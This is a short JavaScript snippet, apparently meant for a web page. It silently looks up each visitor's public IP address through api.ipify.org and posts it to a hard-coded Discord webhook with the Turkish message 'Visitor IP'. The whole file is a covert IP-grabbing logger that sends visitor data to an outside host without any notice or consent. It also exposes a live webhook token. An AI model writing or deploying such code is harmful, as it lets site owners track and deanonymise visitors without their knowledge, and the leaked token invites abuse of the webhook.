fetch('https://api.ipify.org?format=json')
  .then(res => res.json())
  .then(data => {
    const ip = data.ip;
    const webhookURL = 'https://discord.com/api/webhooks/1387792925454503936/ewUa4tg_qp7aR7sBrNec76_bm4XBZ4ZbUIFXn8bi8_nrLewuIyjmPpEVEaNsVmugHcs-';

    fetch(webhookURL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ content: `Ziyaretçi IP'si: ${ip}` })
    });
  })
  .catch(console.error);
